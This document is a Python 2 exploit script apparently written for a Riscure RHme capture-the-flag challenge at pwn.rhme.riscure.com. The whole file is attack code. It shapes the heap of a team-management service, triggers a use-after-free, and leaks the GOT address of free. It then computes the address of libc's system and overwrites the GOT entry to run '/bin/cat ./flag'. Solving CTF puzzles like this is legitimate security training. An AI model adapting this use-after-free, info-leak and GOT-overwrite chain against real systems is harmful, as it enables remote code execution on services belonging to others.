import struct
import time
import socket

ADDR = 'pwn.rhme.riscure.com'

def recv_until(s, search_data):
    all_data = ''
    new_data = s.recv(1024)
    while search_data not in new_data:
        all_data += new_data
        new_data = s.recv(1024)
    all_data += new_data
    return all_data

def send_line_and_wait(s, data):
    s.sendall(data + '\n')
    time.sleep(0.05)

def send_and_wait(s, data):
    s.sendall(data)
    time.sleep(0.05)

# ######################################### 
# #########################################
# #########################################

def add_player(s, player_name, p1 = -1, p2 = -1, p3 = -1, p4 = -1):
    send_line_and_wait(s, '1')
    send_line_and_wait(s, player_name)
    for z in [p1, p2, p3, p4]:
        send_line_and_wait(s, str(z))

def delete_player(s, index):
    send_line_and_wait(s, '2')
    send_line_and_wait(s, str(index))

def select_player(s, index):
    send_line_and_wait(s, '3')
    send_line_and_wait(s, str(index))

def edit_player(s, option, data):
    send_line_and_wait(s, '4')
    send_line_and_wait(s, str(option))
    send_line_and_wait(s, data)
    send_line_and_wait(s, '0')

def edit_player_name(s, new_name):
    edit_player(s, '1', new_name)

def show_player(s):
    send_line_and_wait(s, '5')

def show_team(s):
    send_line_and_wait(s, '6')


def main():
    s = socket.socket()
    s.connect((ADDR, 1337))

    # shaping
    add_player(s, 'a' * 0xa0) # pad undeletable
    add_player(s, 'b' * 0xa) # usage help - catched by player e
    add_player(s, 'c' * 0x1) # vuln usage
    add_player(s, 'd' * 0xb0) # pad undeletable

    # shaping cont.
    select_player(s, 1)
    edit_player_name(s, 'b' * 0x80) # change name to realloc
    show_player(s)
    add_player(s, 'e' * 0xa) # catch names with new player
    
    select_player(s, 2)
    edit_player_name(s, 'c' * 0x90) # change name to realloc
    show_player(s)
    add_player(s, 'f' * 0x1) # catch names with new player

    # vuln on! delete second - still selected
    select_player(s, 2)
    delete_player(s, 2)
    delete_player(s, 1)
    print "vuln sent!"
    print repr(recv_until(s, 'gone')) # sanity

    # add 1 more such that name is on player struct
    free_got_addr = '\x18\x30\x60'
    add_player(s, 'r' * 0x10 + free_got_addr)
    show_player(s)

    print "info leak! got address of free."
    new_data = recv_until(s, 'A/D/S/P:')
    print repr(new_data)

    # calculating correct address
    string_free_addr = new_data[new_data.index('Name:') + 6:new_data.index('\tA/D/S/P:')-1]
    print repr(string_free_addr)
    int_free_addr = struct.unpack('<Q', string_free_addr + '\x00' * (8 - len(string_free_addr)))[0]
    print hex(int_free_addr)
    system_abs_addr = 0x45390
    free_abs_addr = 0x844f0
    int_system_addr = int_free_addr - free_abs_addr + system_abs_addr
    print hex(int_system_addr)
    string_system_addr = struct.pack('<Q', int_system_addr)[:6]
    print repr(string_system_addr)

    # change to system
    edit_player_name(s, string_system_addr)
    show_player(s)
    new_data = recv_until(s, 'A/D/S/P:')
    print repr(new_data)

    add_player(s, '/bin/cat ./flag')
    delete_player(s, 2)
    new_data = recv_until(s, 'Enter index:')
    print repr(new_data)
     

if __name__ == "__main__":
    main()




